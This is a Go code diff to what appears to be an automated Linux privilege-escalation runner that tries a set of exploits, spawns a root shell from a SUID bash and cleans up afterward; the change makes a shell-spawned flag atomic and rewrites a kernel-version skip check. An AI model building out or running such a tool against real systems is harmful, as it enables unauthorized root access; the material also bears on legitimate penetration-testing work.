@@ -9,6 +9,7 @@ import (
 	"sort"
 	"strings"
 	"sync"
+	"sync/atomic"
 	"time"
 )
 
@@ -193,11 +194,10 @@ func runOne(s *systemInfo, e Exploit, stop *bool) {
 		return
 	}
 	if ok, why := e.eligible(s); !ok {
-		if *flagOnlyKern && strings.Contains(why, "kernel") {
-			stepf("%-26s skip (%s)", e.Name, why)
-			return
-		}
-		if strings.Contains(why, "missing tools") {
+		// With -kernel-filter=false, allow kernel-range mismatches to
+		// run anyway (brute-force mode). All other ineligibility reasons
+		// (missing tools, arch mismatch, etc.) must still skip.
+		if !(*flagOnlyKern && strings.Contains(why, "kernel")) {
 			stepf("%-26s skip (%s)", e.Name, why)
 			return
 		}
@@ -242,7 +242,7 @@ func runOne(s *systemInfo, e Exploit, stop *bool) {
 	}
 	if r.rootAfter || r.suidAfter {
 		if !*flagNoSpawn {
-			shellSpawned = rootspawn(&r)
+			shellSpawned.Store(rootspawn(&r))
 		}
 		if !*flagNoStop {
 			*stop = true
@@ -345,7 +345,7 @@ func runAutorootPhases(s *systemInfo, stop *bool) {
 	}
 	if r.rootAfter || r.suidAfter {
 		if !*flagNoSpawn {
-			shellSpawned = rootspawn(&r)
+			shellSpawned.Store(rootspawn(&r))
 		}
 		if !*flagNoStop {
 			*stop = true
@@ -384,11 +384,11 @@ func finalize(s *systemInfo, stop *bool) {
 		if !*flagNoSpawn {
 			// Try to spawn the shell one more time in case the earlier
 			// attempt returned without spawning (no SUID bash at the time).
-			if !shellSpawned && (isSUIDBash() || isRootNow()) {
-				shellSpawned = rootspawn(&runResult{name: "finalize"})
+			if !shellSpawned.Load() && (isSUIDBash() || isRootNow()) {
+				shellSpawned.Store(rootspawn(&runResult{name: "finalize"}))
 			}
 		}
-		if !shellSpawned {
+		if !shellSpawned.Load() {
 			if isSUIDBash() {
 				path := ""
 				for _, p := range suidShellPaths {
@@ -407,7 +407,7 @@ func finalize(s *systemInfo, stop *bool) {
 		}
 		// Only clean up if we never spawned (so we don't wipe the SUID
 		// shell binary the user is now sitting in).
-		if !shellSpawned {
+		if !shellSpawned.Load() {
 			cleanupTemp()
 		}
 		return
@@ -418,7 +418,8 @@ func finalize(s *systemInfo, stop *bool) {
 
 // shellSpawned is set once rootspawn actually drops into a shell, so
 // finalize() doesn't try to spawn twice or clean up a live SUID binary.
-var shellSpawned bool
+// Uses atomic for safe reads from finalize() after the concurrent pool.
+var shellSpawned atomic.Bool
 
 // cleanupTemp removes runner-generated temp files.
 func cleanupTemp() {
